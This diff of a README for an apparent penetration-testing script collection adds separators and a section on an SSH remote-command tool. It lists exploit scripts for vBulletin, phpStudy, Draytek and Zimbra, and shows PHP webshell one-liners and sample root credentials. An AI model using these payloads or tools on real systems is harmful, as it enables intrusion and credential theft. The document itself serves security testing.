@@ -9,6 +9,8 @@ It'll read the passwords in file(named wordlist) and then use pptpsetup to conne
 
 The time interval is 10 seconds.
 
+---
+
 ### portscan.py
 
 Use to scan port.
@@ -18,6 +20,8 @@ The timeout is 3 seconds.
 c++ version：
 
 https://github.com/3gstudent/Homework-of-C-Language/blob/master/portscan.cpp
+
+---
 
 ### urltoip.py
 
@@ -33,6 +37,8 @@ I can use the result of urltoip.py directly.
 
 The IP can be sorted by using Sublime(F9).
 
+---
+
 ### file_deduplication.py
 
 Use to remove duplicate items from file.
@@ -42,6 +48,8 @@ Use to remove duplicate items from file.
 Reference:
 
 https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html
+
+---
 
 ### fofa_api.py
 
@@ -55,6 +63,8 @@ Used to call fofa's api and print the IP from the results.
 
 If you're VIP,you'll get 10000 results.
 
+---
+
 ### vBulletin_5.x_0day_pre-auth_RCE.py
 
 Reference:
@@ -67,6 +77,8 @@ Eg.
 echo \<?php @eval\(\$_POST[pwd]\)\;?\> >test.php
 ```
 
+---
+
 ### phpStudy_5.2-5.45_(php_xmlrpc.dll)_backdoor_RCE.py
 
 Reference:
@@ -78,6 +90,8 @@ Eg.
 ```
 system('cmd /c "echo ^<?php @eval(^$_POST[pwd]);?^> >D:\phpstudy\WWW\test.php"');
 ```
+
+---
 
 ### ExportFirefoxPassword.py
 
@@ -93,11 +107,15 @@ Reference:
 
 https://docs.microsoft.com/en-us/Exchange/new-features/build-numbers-and-release-dates?redirectedfrom=MSDN&view=exchserver-2019
 
+---
+
 ### SMBv3_RCE_Scanner(CVE-2020-0796).py
 
 Use to scan the SMBv3 RCE vulnerability.
 
 The timeout is 3 seconds.
+
+---
 
 ### Unauthenticated_RCE_in_Draytek_Vigor2960\3900\300B.py
 
@@ -113,6 +131,8 @@ Affected Products:
 - Vigor300B <v1.5.1
 - Vigor2960 <v1.5.1
 - Vigor3900 <v1.5.1
+
+---
 
 ### Zimbra_SOAP_API_Manage.py
 
@@ -149,6 +169,8 @@ Support command of admin token:
 - GetMemcachedClientConfig
 - GetLDAPEntries <query> <ldapSearchBase>,Eg:GetLDAPEntries cn=* dc=zimbra,dc=com
 - getalluserhash <ldapSearchBase>,Eg:getalluserhash dc=zimbra,dc=com
+
+---
 
 ### checkEWS.py
 
@@ -201,6 +223,8 @@ ewsManage.py 192.168.1.1 443 plaintext test.com user1 password1 getfolderofinbox
 ewsManage.py test.com 80 ntlmhash test.com user1 c5a237b7e9d8e708d8436b6148a25fa1 listmailofinbox
 ```
 
+---
+
 ### sshCheck.py
 
 Use to check the valid credential of SSH(Support password and privatekeyfile)
@@ -221,4 +245,26 @@ sshCheck.py 192.168.1.1 22 plaintext root toor
 sshCheck.py 192.168.1.1 22 keyfile root id_rsa
 ```
 
+### sshRunCmd
+
+Remote command execution via SSH(Support password and privatekeyfile)
+
+Usage:
+
+```
+sshRunCmd.py <host> <port> <mode><user> <password> <cmd>
+<mode>:
+- plaintext
+- keyfile
+If the <cmd> is shell,you will get an interactive shell
+```
+
+Eg.
+
+```
+sshRunCmd.py 192.168.1.1 22 plaintext root toor shell
+sshRunCmd.py 192.168.1.1 22 keyfile root id_rsa ps
+```
+
+---
 
